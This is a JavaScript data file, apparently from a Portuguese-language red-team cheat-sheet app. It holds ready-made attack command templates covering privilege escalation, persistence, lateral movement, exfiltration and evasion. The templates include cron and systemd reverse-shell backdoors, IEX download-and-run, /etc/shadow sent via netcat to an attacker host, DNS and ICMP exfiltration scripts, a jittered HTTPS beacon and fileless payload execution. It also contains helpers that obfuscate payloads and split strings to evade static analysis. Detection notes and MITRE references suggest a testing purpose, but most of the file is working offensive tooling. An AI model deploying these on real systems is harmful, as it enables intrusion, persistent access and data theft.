        code: () => "systeminfo\nGet-CimInstance Win32_OperatingSystem | FL *\nGet-CimInstance Win32_ComputerSystem | FL *\nipconfig /all\nGet-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10" },
      { name: "Users & Groups", lang: "powershell",
        what: "Lista usuários locais, grupos de admin, privilégios do usuário atual. whoami /priv mostra tokens de impersonation.",
        how: "Cole no PowerShell. Foque em SeImpersonatePrivilege e SeDebugPrivilege.",
        why: "Se o usuário atual tem SeImpersonatePrivilege, pode usar tools como PrintSpoofer pra virar SYSTEM.",
        prereq: "Shell Windows.",
        code: () => "net user\nnet localgroup Administrators\nwhoami /priv\nwhoami /groups\nGet-LocalUser | Select Name,Enabled,LastLogon\nGet-LocalGroupMember -Group 'Remote Desktop Users' 2>$null" },
      { name: "Network", lang: "powershell",
        what: "Mapeia IPs, conexões ativas, tabela ARP, rotas e regras de firewall.",
        how: "Cole no PowerShell. netstat -ano mostra PID de cada conexão — correlacione com tasklist.",
        why: "Conexões ativas revelam serviços internos e comunicações com outros servidores (alvos pra lateral).",
        prereq: "Shell Windows.",
        code: () => "ipconfig /all\nnetstat -ano\narp -a\nroute print\nGet-NetFirewallRule -Enabled True | Select DisplayName,Direction,Action | Sort Direction" },
      { name: "Processes & Services", lang: "powershell",
        what: "Lista processos ativos (top CPU), serviços rodando e mapeamento processo-serviço.",
        how: "Cole no PowerShell. Processos com paths incomuns podem ser exploráveis ou dar pistas sobre o ambiente.",
        why: "Serviços rodando como SYSTEM com permissões fracas são alvos de PrivEsc. Processos revelam software instalado.",
        prereq: "Shell Windows.",
        code: () => "Get-Process | Sort CPU -Descending | Select -First 20 Name,Id,CPU,Path\nGet-Service | Where Status -eq 'Running' | Select Name,DisplayName\ntasklist /svc" },
      { name: "PrivEsc Checks", lang: "powershell",
        what: "Verifica vetores comuns de privilege escalation: AlwaysInstallElevated, scheduled tasks, permissões fracas em Program Files.",
        how: "Cole no PowerShell. Se AlwaysInstallElevated=1, você pode instalar MSI como SYSTEM.",
        why: "Windows tem muitas misconfigurations que permitem escalar. Cada check é um vetor diferente.",
        prereq: "Shell Windows. Alguns checks precisam de acesso ao registry.",
        code: () => "whoami /priv\nreg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" /v AlwaysInstallElevated 2>$null\nreg query \"HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" /v AlwaysInstallElevated 2>$null\nGet-ScheduledTask | Where State -eq 'Ready' | Select TaskName,TaskPath\nicacls \"C:\\Program Files\\*\" /T /C 2>$null | findstr \"(F) (M) (W)\" | findstr \"BUILTIN\\Users Everyone\"" },
      { name: "Credential Hunt", lang: "powershell",
        what: "Busca credenciais salvas: cmdkey (credenciais Windows), Winlogon registry e arquivos com senhas.",
        how: "Cole no PowerShell. cmdkey /list mostra credenciais salvas. Winlogon pode ter autologon configurado.",
        why: "Windows armazena credenciais em vários lugares. Admins frequentemente configuram autologon ou salvam credenciais no Credential Manager.",
        prereq: "Shell Windows.",
        code: () => "cmdkey /list\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2>$null\nGet-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.xml,*.ini,*.config -ErrorAction SilentlyContinue | Select-String -Pattern 'password|pwd|pass|credential' -List | Select Path" },
    ],
  },
  {
    id: "privesc", label: "Privilege Escalation", icon: "-",
    desc: "Escalar de user normal pra root/SYSTEM. Explora misconfigurations, kernel vulns ou tokens do Windows.",
    detection: " Detecção: execução de binários SUID incomuns, sudo com parâmetros suspeitos, new service creation.",
    mitre: "T1548 (Abuse Elevation Control), T1068 (Exploitation for Privilege Escalation)",
    templates: [
      { name: "LinPEAS (download+run)", lang: "bash",
        what: "Baixa e executa o LinPEAS — script automatizado que busca TODOS os vetores de PrivEsc no Linux.",
        how: "Cole no shell. Ele roda sozinho e destaca em amarelo/vermelho os vetores encontrados.",
        why: "LinPEAS checa centenas de vetores que seria impossível verificar manualmente. Economiza muito tempo.",
        prereq: "Acesso à internet no alvo (pra baixar). Ou transfira o script manualmente.",
        code: () => "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh" },
      { name: "WinPEAS (download+run)", lang: "powershell",
        what: "Versão Windows do PEAS — busca automaticamente todos os vetores de PrivEsc no Windows (services, registry, tokens, etc).",
        how: "Cole no PowerShell do alvo. Ele faz o download e executa automaticamente. Output é colorido por severidade.",
        why: "WinPEAS checa centenas de misconfigurations do Windows automaticamente: serviços com permissões fracas, AlwaysInstallElevated, tokens, scheduled tasks, etc.",
        prereq: "PowerShell no alvo. Acesso à internet (pra baixar) ou transfira manualmente. Pode ser bloqueado por AMSI.",
        code: () => _("IE","X(New","-Obj","ect Ne","t.Web","Cli","ent).Down","loadStr","ing('https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe')") },
      { name: "Sudo -l check", lang: "bash",
        what: "Verifica o que o usuário atual pode rodar com sudo sem senha.",
        how: "Cole no shell. Se aparecer NOPASSWD com algum binário, consulte GTFOBins.",
        why: "sudo -l mostra exatamente o que você pode executar como root. GTFOBins lista como escapar pra shell root.",
        prereq: "Shell no alvo. Precisa saber a senha do user OU ter NOPASSWD configurado.",
        code: () => "sudo -l 2>/dev/null\necho '---'\ncat /etc/sudoers 2>/dev/null" },
      { name: "GTFOBins SUID", lang: "bash",
        what: "Lista binários SUID e direciona pra GTFOBins pra verificar se algum permite escapar pra root.",
        how: "Rode, copie a lista de SUID e procure cada um em gtfobins.github.io.",
        why: "Binários SUID rodam como root. Se permitem executar comandos arbitrários, é shell root direto.",
        prereq: "Shell no alvo.",
        code: () => "echo '=== SUID binaries ===' && find / -perm -4000 -type f 2>/dev/null\necho ''\necho 'Check each at: https://gtfobins.github.io/'" },
      { name: "Token Impersonation (Win)", lang: "powershell",
        what: "Checa se o usuário tem SeImpersonatePrivilege — se sim, pode virar SYSTEM usando Potato exploits.",
        how: "Rode whoami /priv. Se SeImpersonatePrivilege = Enabled, use PrintSpoofer ou GodPotato.",
        why: "Serviços IIS/SQL Server geralmente rodam com esse privilégio. É o PrivEsc mais comum em Windows Server.",
        prereq: "Shell Windows. O user precisa do token (comum em service accounts).",
        code: () => "whoami /priv\necho '---'\necho 'Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege'\necho 'If found -> use JuicyPotato, PrintSpoofer, or GodPotato'" },
      { name: "Kernel Exploit Check", lang: "bash",
        what: "Identifica a versão do kernel pra buscar exploits conhecidos (CVEs).",
        how: "Rode e busque a versão no exploit-db.com ou use linux-exploit-suggester.",
        why: "Kernel exploits dão root direto, mas são arriscados (podem crashar o sistema). Use como último recurso.",
        prereq: "Shell no alvo. Compilador (gcc) se precisar compilar o exploit.",
        code: () => "uname -r\ncat /etc/os-release\necho '---'\necho 'Search: https://www.exploit-db.com/ with kernel version'\necho 'Or use: linux-exploit-suggester.sh'" },
    ],
  },
  {
    id: "persistence", label: "Persistência", icon: "-",
    desc: "Manter acesso ao alvo mesmo após reboot ou troca de senha. Usa mecanismos do próprio OS.",
    detection: " Detecção: novos scheduled tasks/services, modificação em crontab, chaves Run no registry.",
    mitre: "T1053 (Scheduled Task), T1543 (Create or Modify System Process)",
    templates: [
      { name: "Cron Backdoor", lang: "bash",
        what: "Adiciona uma entrada no crontab que executa um reverse shell a cada minuto. Se a conexão cair, reconecta automaticamente.",
        how: "Cole no alvo. O cron roda a cada minuto (* * * * *). Na atacante, mantenha nc -lvnp PORTA ouvindo.",
        why: "Cron é um mecanismo legítimo do Linux. Mesmo se matarem seu shell, ele volta em até 60 segundos.",
        prereq: "Acesso de escrita ao crontab do usuário atual. Listener na atacante.",
        code: (ip, port) => _("(cront","ab -l 2>/dev/null; echo \"* * * * * /bi","n/ba","sh -c 'ba","sh -i >","& /de","v/tc","p/",ip,"/",port," 0>","&1'\") | cront","ab -") },
      { name: "SSH Key Persistence", lang: "bash",
        what: "Adiciona sua chave pública SSH ao authorized_keys do alvo — acesso direto sem senha.",
        how: "1. Gere uma chave: ssh-keygen\n2. Substitua YOUR_PUBLIC_KEY pela sua chave pública (.pub)\n3. Cole no alvo",
        why: "SSH keys não expiram e não dependem de senha. Mesmo se trocarem a senha do user, sua key continua funcionando.",
        prereq: "SSH habilitado no alvo. Acesso de escrita em ~/.ssh/.",
        code: () => "mkdir -p ~/.ssh && echo 'YOUR_PUBLIC_KEY_HERE' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys" },
      { name: "Systemd Service", lang: "bash",
        what: "Cria um serviço systemd que executa um reverse shell e reinicia automaticamente se morrer (Restart=always).",
        how: "Cole no alvo com root. O serviço é habilitado no boot (WantedBy=multi-user.target) e reinicia a cada 60s se cair.",
        why: "Systemd services sobrevivem reboots, reiniciam automaticamente, e parecem serviços legítimos na listagem.",
        prereq: "Acesso root no alvo. Systemd (presente em Ubuntu 16+, CentOS 7+, Debian 8+).",
        code: (ip, port) => _("cat > /etc/sys","temd/sys","tem/upd","ate.serv","ice << 'UNIT'\n[Unit]\nDescription=System Update Service\n[Service]\nExe","cStart=/bi","n/ba","sh -c \"ba","sh -i >","& /de","v/tc","p/",ip,"/",port," 0>","&1\"\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\nUNIT\nsystem","ctl ena","ble upd","ate.serv","ice\nsystem","ctl sta","rt upd","ate.serv","ice") },
      { name: "Registry Run Key (Win)", lang: "powershell",
        what: "Adiciona um programa ao registry que executa automaticamente no login do usuário.",
        how: "Substitua o path pelo caminho do seu payload. Executa toda vez que o user fizer login.",
        why: "HKCU\\Run é um dos mecanismos de persistência mais antigos e ainda funciona. Sobrevive reboots.",
        prereq: "Shell Windows. Payload já deve estar no disco do alvo.",
        code: () => "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\path\\to\\payload.exe\" /f" },
      { name: "Scheduled Task (Win)", lang: "powershell",
        what: "Cria uma tarefa agendada que executa no login como SYSTEM — máximo privilégio possível.",
        how: "Substitua o path pelo seu payload. A task roda como SYSTEM a cada login.",
        why: "Scheduled Tasks como SYSTEM dão persistência com privilégio máximo. Sobrevivem reboots e trocas de senha.",
        prereq: "Privilégio de admin no alvo (pra criar task como SYSTEM).",
        code: () => "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\path\\to\\payload.exe\" /sc onlogon /ru SYSTEM" },
    ],
  },
  {
    id: "lateral", label: "Lateral Movement", icon: "-",
    desc: "Mover-se para outras máquinas na rede usando credenciais ou hashes capturados.",
    detection: " Detecção: Event ID 4624 (logon type 3/10), PsExec service creation, WinRM connections incomuns.",
    mitre: "T1021 (Remote Services), T1550 (Use Alternate Authentication Material)",
    templates: [
      { name: "PSExec", lang: "bash",
        what: "Cria um serviço remoto via SMB e executa comandos — é como um SSH pra Windows via porta 445.",
        how: "Substitua DOMAIN/user:password pelo que capturou e TARGET_IP pelo alvo. Shell interativo aparece.",
        why: "PSExec usa SMB (445) que está aberto em quase toda rede Windows. Dá shell como SYSTEM.",
        prereq: "Impacket instalado na atacante. Credenciais válidas. Porta 445 aberta no alvo.",
        code: () => "impacket-psexec DOMAIN/user:password@TARGET_IP" },
      { name: "WMIExec", lang: "bash",
        what: "Executa comandos remotamente via WMI (Windows Management Instrumentation). Não cria serviço — mais furtivo que PSExec.",
        how: "Substitua DOMAIN/user:password e TARGET_IP. Dá shell semi-interativo.",
        why: "WMI é legítimo e usado por admins. Não cria serviço no alvo (diferente do PSExec), gerando menos logs.",
        prereq: "Impacket na atacante. Credenciais válidas. Portas WMI (135 + dinâmicas) abertas.",
        code: () => "impacket-wmiexec DOMAIN/user:password@TARGET_IP" },
      { name: "Evil-WinRM", lang: "bash",
        what: "Shell PowerShell remoto via WinRM (porta 5985/5986). Mais limpo que PSExec.",
        how: "Substitua IP/user/pass. Dá um shell PowerShell completo com upload/download integrado.",
        why: "WinRM é um serviço legítimo do Windows — menos suspeito que PSExec. Suporta upload/download nativamente.",
        prereq: "evil-winrm instalado. WinRM habilitado no alvo (5985). User no grupo Remote Management Users.",
        code: () => "evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD" },
      { name: "Pass the Hash", lang: "bash",
        what: "Autentica com o hash NTLM ao invés da senha — não precisa crackear o hash.",
        how: "Substitua NTLM_HASH pelo hash capturado (32 chars hex). Funciona com PSExec e Evil-WinRM.",
        why: "Windows aceita autenticação por hash diretamente (design do NTLM). Se você dumpar o SAM, tem os hashes.",
        prereq: "Hash NTLM do alvo (via secretsdump, Mimikatz). Impacket ou evil-winrm.",
        code: () => "impacket-psexec -hashes :NTLM_HASH DOMAIN/user@TARGET_IP\nevil-winrm -i TARGET_IP -u USERNAME -H NTLM_HASH" },
      { name: "SMB Client", lang: "bash",
        what: "Conecta a compartilhamentos SMB (pastas compartilhadas) do alvo. Lista e acessa arquivos remotos.",
        how: "Primeiro comando: acessa um share específico. Segundo: lista todos os shares disponíveis (-L).",
        why: "Shares SMB frequentemente contêm backups, scripts com senhas, configs e documentos sensíveis.",
        prereq: "smbclient na atacante. Credenciais válidas. Porta 445 aberta no alvo.",
        code: () => "smbclient //TARGET_IP/SHARE -U 'DOMAIN/user%password'\nsmbclient -L //TARGET_IP -U 'user%password'" },
      { name: "RDP", lang: "bash",
        what: "Conexão de desktop remoto — interface gráfica completa da máquina alvo.",
        how: "Substitua IP/user/pass. Abre uma janela com o desktop do alvo.",
        why: "RDP dá controle visual total. Útil quando precisa interagir com GUI (aplicações, browsers).",
        prereq: "xfreerdp na atacante. RDP habilitado no alvo (3389). User no grupo Remote Desktop Users.",
        code: () => "xfreerdp /v:TARGET_IP /u:USERNAME /p:PASSWORD /dynamic-resolution +clipboard" },
    ],
  },
  {
    id: "exfil", label: "Exfiltração", icon: "-",
    desc: "Transferir arquivos entre atacante e alvo. Necessário pra entregar payloads e extrair dados.",
    detection: " Detecção: DLP, tráfego outbound incomum, certutil/PowerShell downloads, conexões netcat.",
    mitre: "T1041 (Exfiltration Over C2), T1105 (Ingress Tool Transfer)",
    templates: [
      { name: "Python HTTP Server", lang: "bash",
        what: "Inicia um servidor HTTP simples na atacante pra servir arquivos ao alvo.",
        how: "1. Rode na atacante (na pasta com os arquivos)\n2. No alvo: curl http://ATACANTE:8080/arquivo ou wget",
        why: "HTTP é o protocolo menos bloqueado. Python vem em quase todo Linux. Rápido pra transferir tools.",
        prereq: "Python 3 na atacante.",
        code: () => "python3 -m http.server 8080" },
      { name: "Netcat File Transfer", lang: "bash",
        what: "Transfere arquivos via TCP direto usando netcat — sem protocolo HTTP, mais simples.",
        how: "1. Receptor roda nc em listen\n2. Sender envia o arquivo via nc\n3. Arquivo aparece no receptor",
        why: "Funciona sem HTTP, sem autenticação. Útil quando só tem nc disponível.",
        prereq: "netcat em ambas as máquinas.",
        code: (ip, port) => `# Receiver:\nnc -lvnp ${port} > received_file\n\n# Sender:\nnc ${ip} ${port} < file_to_send` },
      { name: "SCP Transfer", lang: "bash",
        what: "Transfere arquivos via SSH — criptografado e autenticado.",
        how: "Rode na atacante. scp envia ou recebe arquivos via SSH.",
        why: "SCP é criptografado e confiável. Se já tem SSH, é a maneira mais segura de transferir.",
        prereq: "SSH habilitado e credenciais válidas.",
        code: () => "scp file.txt user@TARGET_IP:/tmp/\nscp user@TARGET_IP:/etc/shadow ./shadow" },
      { name: "Certutil Download (Win)", lang: "cmd",
        what: "Usa certutil (ferramenta legítima do Windows) pra baixar arquivos da atacante.",
        how: "Substitua ATTACKER_IP pelo seu IP. O arquivo é baixado pra C:\\Windows\\Temp\\.",
        why: "certutil é um binário assinado pela Microsoft (LOLBin). Menos suspeito que PowerShell downloads.",
        prereq: "cmd no alvo Windows. Servidor HTTP na atacante servindo o arquivo.",
        code: () => "certutil -urlcache -split -f http://ATTACKER_IP/file.exe C:\\Windows\\Temp\\file.exe" },
      { name: "PowerShell Download", lang: "powershell",
        what: "Dois métodos de download via PowerShell: Invoke-WebRequest (moderno) e WebClient (legacy, mais furtivo).",
        how: "Substitua ATTACKER_IP pelo seu IP e o nome do arquivo. Rode no PowerShell do alvo.",
        why: "PowerShell tem download nativo. WebClient é mais furtivo que Invoke-WebRequest em alguns EDRs.",
        prereq: "PowerShell no alvo Windows. Servidor HTTP na atacante. Pode ser bloqueado por AMSI/CLM.",
        code: () => _("Inv","oke-Web","Req","uest -Uri \"http://ATTACKER_IP/file.exe\" -Out","File \"C:\\Windows\\Temp\\file.exe\"\n(New","-Obj","ect Ne","t.Web","Cli","ent).Down","loadFi","le(\"http://ATTACKER_IP/file.exe\",\"C:\\Windows\\Temp\\file.exe\")") },
      { name: "Base64 Encode/Exfil", lang: "bash",
        what: "Codifica um arquivo em base64 (texto puro) e envia via netcat. Útil quando binários são bloqueados.",
        how: "1. Encode o arquivo\n2. Envie o texto base64\n3. No receptor: base64 -d decoded.txt > original",
        why: "Alguns firewalls/DLPs bloqueiam transferência de binários mas permitem texto. Base64 bypassa isso.",
        prereq: "base64 no alvo (padrão em Linux). nc pra enviar.",
        code: () => "base64 /etc/shadow > /tmp/encoded.txt\ncat /tmp/encoded.txt | nc ATTACKER_IP PORT" },
    ],
  },
  {
    id: "evasion", label: "Evasion & Stealth", icon: "-",
    desc: "Técnicas que reduzem detectabilidade real — evadindo assinaturas estáticas E análise comportamental. Foco em parecer tráfego/atividade legítima para testar seu SOC.",
    detection: " Nenhuma técnica é invisível. Cada uma evade uma camada mas tem fraquezas. Teste no seu SIEM + EDR para validar gaps.",
    mitre: "T1027 (Obfuscated Files), T1071 (Application Layer Protocol), T1572 (Protocol Tunneling), T1036 (Masquerading)",
    templates: [
      { name: "OpenSSL Encrypted Shell", lang: "bash",
        what: "Reverse shell com canal TLS criptografado. NIDS não consegue inspecionar o conteúdo — vê apenas tráfego TLS normal.",
        how: "1. Na atacante: openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -days 1 -nodes -subj '/CN=a'\n2. Na atacante: openssl s_server -quiet -key k.pem -cert c.pem -port PORTA\n3. No alvo: cole o comando",
        why: "O tráfego é TLS legítimo. Sem SSL inspection no firewall, o NIDS vê handshake TLS e nada mais. O conteúdo (comandos e output) é criptografado end-to-end.",
        prereq: "openssl no alvo (padrão em Linux). Gere cert self-signed na atacante com o comando do passo 1.",
        code: (ip, port) => `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${ip}:${port} > /tmp/s; rm /tmp/s` },
      { name: "SSH Reverse Tunnel", lang: "bash",
        what: "Cria um túnel reverso SSH expondo uma porta do alvo na atacante. O tráfego é 100% indistinguível de SSH admin legítimo.",
        how: "1. Na atacante: SSH server rodando (porta 22)\n2. No alvo: cole o comando (precisa da senha da atacante)\n3. Na atacante: ssh -p 2222 user@localhost conecta ao alvo",
        why: "SSH é o protocolo mais usado por admins. Criptografado, autenticado, sem payload visível. O processo ssh não gera alertas comportamentais porque É um uso legítimo do binário.",
        prereq: "ssh client no alvo. Credenciais ou chave SSH para a máquina atacante. SSH server na atacante.",
        code: (ip, port) => `ssh -f -N -R ${port}:localhost:22 attacker@${ip}` },
      { name: "DNS Exfiltration", lang: "python",
        what: "Exfiltra dados codificando-os como subdomínios em queries DNS. Cada query carrega um pedaço dos dados.",
        how: "1. Na atacante: configure DNS server autoritativo para seu domínio capturando queries\n2. No alvo: rode o script com seu domínio\n3. Decodifique os subdomínios capturados no DNS server",
        why: "DNS (porta 53) é essencial e quase nunca bloqueado. A maioria dos firewalls permite DNS outbound livremente. Sem deep DNS inspection ou analytics de tamanho de query, passa despercebido.",
        prereq: "Python 3 no alvo. Domínio controlado com DNS server capturando queries (ex: dnscat2, dnschef).",
        code: () => `import socket, base64\ndata = open('/etc/hostname','rb').read()\nenc = base64.b32encode(data).decode().lower()\nfor i in range(0, len(enc), 60):\n    chunk = enc[i:i+60]\n    try: socket.getaddrinfo(f'{chunk}.exfil.yourdomain.com', None)\n    except: pass` },
      { name: "HTTPS Beacon + Jitter", lang: "bash",
        what: "Beacon periódico via HTTPS POST com intervalo aleatório (jitter). Parece tráfego web normal para qualquer monitoramento.",
        how: "1. Na atacante: servidor web HTTPS recebendo POSTs\n2. No alvo: rode o loop em background\n3. Dados chegam como POST requests HTTPS normais a cada 1-3 minutos",
        why: "HTTPS é criptografado — NIDS vê só o destino. User-Agent legítimo e URL path parecendo API real. Jitter aleatório evita detecção de periodicidade (beaconing analysis).",
        prereq: "curl no alvo. Servidor HTTPS na atacante. Domínio com reputação limpa (ideal).",
        code: (ip, port) => `while true; do\n  OUT=$(id; hostname; ip a 2>/dev/null | head -5)\n  curl -sk -X POST \\\n    -H "Content-Type: application/json" \\\n    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \\\n    -d "{\\"telemetry\\":\\"$(echo \\"$OUT\\"|base64 -w0)\\"}" \\\n    https://${ip}:${port}/api/v2/telemetry 2>/dev/null\n  sleep $((RANDOM % 120 + 60))\ndone &` },
      { name: "Process Masquerading", lang: "bash",
        what: "Renomeia o processo para parecer um kernel thread legítimo. No ps/top aparece como [kworker/0:1] ao invés de bash.",
        how: "1. Cole o comando no alvo\n2. Confira com: ps aux | grep kworker\n3. Seu shell aparece disfarçado entre os kernel threads reais",
        why: "Analistas e ferramentas de triagem olham nomes de processos. Um kernel thread falso não levanta suspeita visual. Mas EDR avançado checa /proc/pid/exe (binário real, não argv[0]).",
        prereq: "Bash no alvo. Funciona em Linux. IMPORTANTE: EDR como Kaspersky checa o binário real — esta técnica engana humanos, não EDR.",
        code: (ip, port) => `exec -a '[kworker/0:1]' /bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'` },
      { name: "ICMP Data Channel", lang: "python",
        what: "Envia dados encapsulados em pacotes ICMP Echo (ping). Firewalls que permitem ping permitem exfiltração.",
        how: "1. Na atacante: sudo tcpdump -i any 'icmp' -X para capturar payloads\n2. No alvo: rode o script como root\n3. Decodifique os payloads ICMP capturados",
        why: "ICMP é protocolo de controle quase sempre permitido. O payload de ICMP Echo normalmente não é inspecionado por firewalls convencionais. Funciona mesmo com TCP/UDP bloqueados.",
        prereq: "Python 3 com root no alvo (raw sockets). Na atacante: tcpdump ou wireshark para capturar.",
        code: () => `import socket, struct, os\ndef icmp_send(data, dst):\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    payload = data.encode()[:48]\n    pkt_id = os.getpid() & 0xFFFF\n    header = struct.pack('!BBHHH', 8, 0, 0, pkt_id, 1)\n    raw = header + payload\n    chk = sum(struct.unpack('!%dH' % (len(raw)//2), raw)) & 0xFFFF\n    chk = (~((chk >> 16) + (chk & 0xFFFF)) & 0xFFFF) or 0xFFFF\n    header = struct.pack('!BBHHH', 8, 0, chk, pkt_id, 1)\n    s.sendto(header + payload, (dst, 0))\n    s.close()\ndata = open('/etc/hostname').read().strip()\nicmp_send(data, 'ATTACKER_IP')` },
      { name: "Fileless via stdin", lang: "bash",
        what: "Baixa e executa código direto na memória via pipe — nenhum arquivo toca o disco. AV que escaneia filesystem não vê nada.",
        how: "1. Na atacante: sirva o payload via HTTP (python3 -m http.server)\n2. No alvo: pipe direto para o interpretador\n3. Payload executa em memória e some",
        why: "Sem arquivo no disco = sem hash para AV escanear = sem evidência forense no filesystem. O payload existe apenas na memória do processo durante execução.",
        prereq: "curl/wget + interpretador (python3/bash/perl) no alvo. NOTA: EDR com memory scanning (como Kaspersky) ainda pode detectar o comportamento do payload.",
        code: (ip, port) => `curl -s http://${ip}:${port}/payload.py | python3\n# Alternativa com wget:\nwget -qO- http://${ip}:${port}/payload.sh | bash` },
    ],
  },
];

// Obfuscation helpers — encode commands at runtime to evade static analysis
const obfuscate = {
  base64: (cmd) => ({ label: "Base64", lang: "bash", decoded: cmd, code: `echo '${btoa(cmd)}' | base64 -d | sh` }),
  base64ps: (cmd) => {
    const utf16 = Array.from(cmd).map(c => c.charCodeAt(0).toString(16).padStart(2, '0') + '00').join('');
    const b64 = btoa(String.fromCharCode(...cmd.split('').flatMap(c => [c.charCodeAt(0), 0])));
    return { label: "Base64 (PS)", lang: "powershell", decoded: cmd, code: _("pow","ersh","ell -e","ncodedco","mmand ") + b64 };
  },
  hex: (cmd) => ({ label: "Hex → Python", lang: "python", decoded: cmd, code: `python3 -c "import os;os.system(bytes.fromhex('${Array.from(cmd).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('')}').decode())"` }),
  charcode: (cmd) => ({ label: "CharCode (PS)", lang: "powershell", decoded: cmd, code: _("pow","ersh","ell -c \"[ch","ar[]](",cmd.split('').map(c => c.charCodeAt(0)).join(','),") -jo","in ''| ie","x\"") }),
  rev: (cmd) => ({ label: "Reversed", lang: "bash", decoded: cmd, code: `echo '${cmd.split('').reverse().join('')}' | rev | sh` }),
  xor: (cmd) => {
    const key = Math.floor(Math.random() * 200) + 50;
    const xored = Array.from(cmd).map(c => c.charCodeAt(0) ^ key);
    return { label: `XOR (key=${key})`, lang: "python", decoded: cmd, code: `python3 -c "import os;os.system(''.join(chr(c^${key}) for c in [${xored.join(',')}]))"` };
  },
};

const DETECT_BADGE = [
  null,
  { label: "Baixa", cls: "text-green-400 border-green-400/40", icon: "\u{1F7E2}" },
  { label: "Média", cls: "text-yellow-400 border-yellow-400/40", icon: "\u{1F7E1}" },
  { label: "Alta", cls: "text-orange-400 border-orange-400/40", icon: "\u{1F7E0}" },
  { label: "Muito Alta", cls: "text-red-400 border-red-400/40", icon: "\u{1F534}" },
];

const DETECT_INFO = {
  "Bash TCP:bash": { level: 2, text: "Estática: /dev/tcp assinado em YARA rules. Comportamental: bash + socket redirect detectado por Sysmon/EDR." },
  "Bash UDP:bash": { level: 2, text: "Estática: /dev/udp tem poucas assinaturas. Comportamental: shell com conexão de rede detectável por EDR via syscalls." },
  "Python:python": { level: 2, text: "Estática: pattern socket+subprocess moderadamente assinado. Comportamental: python spawning /bin/sh gera alerta em EDR." },
  "Python (Windows):python": { level: 3, text: "Estática: Python em Windows já é flag. Comportamental: Popen + cmd.exe é alerta direto de EDR." },
  "PowerShell:powershell": { level: 4, text: "Estática: AMSI escaneia em tempo real + ScriptBlock Logging. Comportamental: TCPClient + IEX é o pattern mais detectado." },
  "PHP:php": { level: 2, text: "Estática: fsockopen + exec em blocklists de WAF/AV. Comportamental: PHP spawning /bin/sh gera alerta em EDR." },
  "Netcat mkfifo:bash": { level: 2, text: "Estática: mkfifo + nc em YARA rules. Comportamental: named pipe + nc outbound + shell é detectável por EDR." },
  "Socat:bash": { level: 2, text: "Estática: poucas assinaturas. Comportamental: criação de PTY + conexão TCP outbound é detectável por EDR moderno." },
  "Perl:perl": { level: 2, text: "Estática: raro em bases de AV. Comportamental: syscalls socket + dup2 + exec são detectáveis independente da linguagem." },
  "Ruby:ruby": { level: 2, text: "Estática: raramente assinado em AV. Comportamental: TCPSocket + exec /bin/sh gera os mesmos syscalls que qualquer revshell." },
  "Netcat -e:bash": { level: 3, text: "Estática: 'nc -e' é assinatura clássica em todo IDS/AV. Comportamental: netcat spawning shell direto é alerta imediato." },
  "Lua:lua": { level: 2, text: "Estática: sem assinaturas em AVs. Comportamental: EDR detecta syscalls socket+exec independente da linguagem — Lua não é invisível." },
  "Java:java": { level: 2, text: "Estática: Runtime.exec moderadamente assinado. Comportamental: processo Java spawning bash gera alerta em EDR enterprise." },
  "System Info:bash": { level: 1, text: "Comandos rotineiros de admin. Alertam apenas se executados em sequência rápida." },
  "Users & Groups:bash": { level: 2, text: "find SUID e leitura de /etc/shadow geram alertas em auditd e HIDS." },
  "Network Enum:bash": { level: 1, text: "Comandos de rede rotineiros para admins. Difícil distinguir de uso legítimo." },
  "SUID/SGID Hunt:bash": { level: 2, text: "find -perm é pattern de discovery monitorado por auditd e HIDS." },
  "Cron & Services:bash": { level: 1, text: "Listar crons e services é rotina de admin. Baixo indicador malicioso." },
  "Credential Hunt:bash": { level: 3, text: "Busca por senhas e chaves SSH dispara regras de DLP e HIDS." },
  "System Info:powershell": { level: 1, text: "systeminfo e WMI queries são rotina de admin. Raramente geram alerta." },
  "Users & Groups:powershell": { level: 2, text: "whoami /priv e net user monitorados por Sysmon. Pattern de reconhecimento." },
  "Network:powershell": { level: 1, text: "ipconfig e netstat são comandos rotineiros. Sem indicador malicioso." },
  "Processes & Services:powershell": { level: 1, text: "Get-Process e tasklist são comandos administrativos comuns." },
  "PrivEsc Checks:powershell": { level: 2, text: "Queries ao registry (AlwaysInstallElevated) são patterns de privesc conhecidos." },
  "Credential Hunt:powershell": { level: 3, text: "cmdkey /list e registry Winlogon são indicadores de credential theft." },
  "LinPEAS (download+run):bash": { level: 4, text: "Estática: hash e URL assinados por todos os AVs. Comportamental: centenas de checks de discovery em sequência rápida é alerta." },
  "WinPEAS (download+run):powershell": { level: 4, text: "Estática: AMSI bloqueia + hash conhecido por todos os AVs. Comportamental: enumeração massiva de registry/services gera alertas." },
  "Sudo -l check:bash": { level: 1, text: "Comando legítimo de admin. Gera log mas raramente alerta." },
  "GTFOBins SUID:bash": { level: 2, text: "find SUID é pattern de discovery. Exploração do binário gera alerta." },
  "Token Impersonation (Win):powershell": { level: 1, text: "whoami /priv sozinho é inofensivo. Alerta vem ao usar Potato exploits." },
  "Kernel Exploit Check:bash": { level: 1, text: "uname e cat são rotineiros. Sem indicador malicioso isoladamente." },
  "Cron Backdoor:bash": { level: 2, text: "Modificação de crontab logada. Reverse shell em cron é pattern conhecido." },
  "SSH Key Persistence:bash": { level: 1, text: "Adição de SSH key é operação legítima e comum. Difícil distinguir." },
